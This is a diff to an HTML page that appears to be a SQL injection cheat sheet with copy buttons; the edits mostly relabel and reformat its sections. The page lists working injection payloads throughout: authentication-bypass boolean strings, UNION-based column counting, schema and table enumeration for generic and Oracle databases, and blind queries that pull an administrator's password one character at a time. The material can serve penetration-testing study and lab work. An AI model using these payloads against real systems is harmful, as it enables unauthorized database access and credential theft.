@@ -52,12 +52,12 @@
 <summary>HIDDEN DATA TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It will use some boolean conditions in order to retrieve content from the database.
 
-If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean 
+If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean 
 conditions are used.
 	
-<b>C1: </b><p id="HDT01"><mark>' OR 1=1--</mark></p>
-<b>C2: </b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
-<b>C3: </b><p id="HDT03"><mark>' and 1=2;--</mark></p>
+<b>C1: TRUE </b><p id="HDT01"><mark>' OR 1=1--</mark></p>
+<b>C2: TRUE </b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
+<b>C3: FALSE </b><p id="HDT03"><mark>' and 1=2;--</mark></p>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button></p>
 </details>
 <details>
@@ -71,26 +71,26 @@ conditions are used.
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> Techniques used to retrieve the database version.
+<p><b>DESCRIPTION:</b> Techniques used to retrieve the database version, columns number, field type, etc.
 
-<b>--</b> or <b>#</b> | It is used in SQL query language to comment out ignoring the rest of the query. <br>
+<b>--</b> or <b>#</b> | Are used in SQL query language to comment ignoring the rest of the query. <br>
 	
 <b>PRE-REQS:</b>
-1. get column number
+<u>1. get column number</u>
 
-<b>Method C1: </b><p id="DTT01"><mark>' ORDER BY 1--</mark></p> 
-<b>Method C2: </b><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p>
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT01')">.MC1.</button> |  <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT02')">.MC2.</button><br>
+<b>C1: METHOD </b><p id="DTT01"><mark>' ORDER BY 1--</mark></p> 
+<b>C2: METHOD </b><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT01')">.C1.</button> |  <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT02')">.C2.</button><br>
 	
-2. get field type
+<u>2. get field type</u>
 	
-<p>C1: </p><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
-<b>C2: </b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
-<b>C3: </b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
+<p>C1: STRING TEST</p><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
+<b>C2: STRING TEST</b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
+<b>C3: ORACLE TEST</b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
 <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT05')">.C3.</button>
 <br>
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
-is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
+is needed. Also, for ORACLE the select statement <u>is needed a table to search from</u>, it can be any table.
 	
 <b>COMMON TESTS:</b>
 
@@ -121,13 +121,13 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 1. get column number
 2. get field type
 
-*after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
+*after that information is collected, it is time to retrieve the <b>TABLE_NAME</b> of the database schema.
 
 <b>C1: </b><p id="LDCT01"><mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark></p> 
-*once table is identified, it is time to retrieve the COLUMNS of the table
+*once table is identified, it is time to retrieve the <b>COLUMNS</b> of the table
 
 <b>C2: </b><p id="LDCT02"><mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark></p> 
-*once table_name and columns are identified, it is time to retrieve the CONTENT
+*once table_name and columns are identified, it is time to retrieve the <b>CONTENT</b>
 
 <b>C3: </b><p id="LDCT03"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p> 
 
@@ -140,19 +140,19 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 1. get column number
 2. get field type
 
-*after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
+*after that information is collected, it is time to retrieve the <b>TABLE_NAME</b> of the database schema.
 
 <b>C1: </b><p id="LDCT04"><mark>' UNION SELECT table_name,NULL from ALL_TABLES--</mark></p>
-*once table is identified, it is time to retrieve the COLUMNS of the table
+*once table is identified, it is time to retrieve the <b>COLUMNS</b> of the table
 
 <b>C2: </b><p id="LDCT05"><mark>' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark></p>
-*once table_name and columns are identified, it is time to retrieve the CONTENT
+*once table_name and columns are identified, it is time to retrieve the <b>CONTENT</b>
 
 <b>C3: </b><p id="LDCT06"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT06')">.C3.</button></p>
 </details>
-<b>NOTE:</b> both ways needs to know the column number, field type and both examples are assuming it has
+<b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has
 two columns and both type string.</p>
 </details>
 <details>
@@ -160,18 +160,18 @@ two columns and both type string.</p>
 <p><b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
 from other tables.
 
-STEP1: get query columns number
+<b>STEP1:</b> get query columns number
 
 <b>C1: </b><p id="UAT01"><mark>' UNION SELECT NULL--</mark></p>
 *add null values until the error disappears
 
-STEP2: get column field type
+<b>STEP2:</b> get column field type
 
 <b>C2: non-oracle </b><p id="UAT02"><mark>' UNION SELECT NULL,'a'--</mark></p>
 <b>C3: oracle</b><p id="UAT03"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
 *assuming two columns
 
-... after those steps, please refer to LISTING DATABASE CONTENT TECHNIQUES, it will apply the same.
+... after those steps, please refer to <b>LISTING DATABASE CONTENT TECHNIQUES</b>, it will apply the same.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT03')">.C3.</button></p>
 </details>
@@ -180,8 +180,7 @@ STEP2: get column field type
 <p><b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. 
 Look for any new behavior after small changes.
 <details>
-<summary>CONDITIONAL RESPONSES</summary>
-	
+<summary>CONDITIONAL RESPONSES</summary>	
 <b>C1: TRUE</b><p id="BAT01"><mark>' AND '1'='1</mark></p>
 <b>C2: FALSE</b><p id="BAT02"><mark>' AND '1'='2</mark></p>
 
@@ -189,31 +188,31 @@ Look for any new behavior after small changes.
 
 To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.<br>
 
-> <u>check if table exist ?</u>
+<u>check if table exist ?</u>
+	
 <b>C1: TRUE condition means table exist !</b><p id="BAT03"><mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark></p>
-
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT03')">.C1.</button>
 
-> <u>check if column value exist ?</u>
-<b>C1: </b><p id="BAT04"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark></p> | TRUE condition means column value exist !
-<b>C2: </b><p id="BAT05"><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark></p>
+<u>check if column value exist ?</u>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT05')">.C2.</button>
+<b>C1: TRUE condition means column value exist !</b><p id="BAT04"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark></p>
+<b>Sample: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> 
 
-> <u>check the character lenght of the column ?</u>
+<u>check the character lenght of the column ?</u>
 <b>C1: </b><p id="BAT06"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark></p>
-<b>C2: </b><p id="BAT07"><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark></p>
+<b>Sample: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT07')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT06')">.C1.</button>
 
 <b>Note:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement.
 
 > <u>check the characters of the column ?</u>
 <b>C1: </b><p id="BAT08"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark></p>
-<b>C2: </b><p id="BAT09"><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark></p>
+<b>Sample: </b><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT08')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT09')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT08')">.C1.</button>
 
 So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to
 iterate more times with each letter, number, etc. For that reason a pre-req is to know the value lenght. 
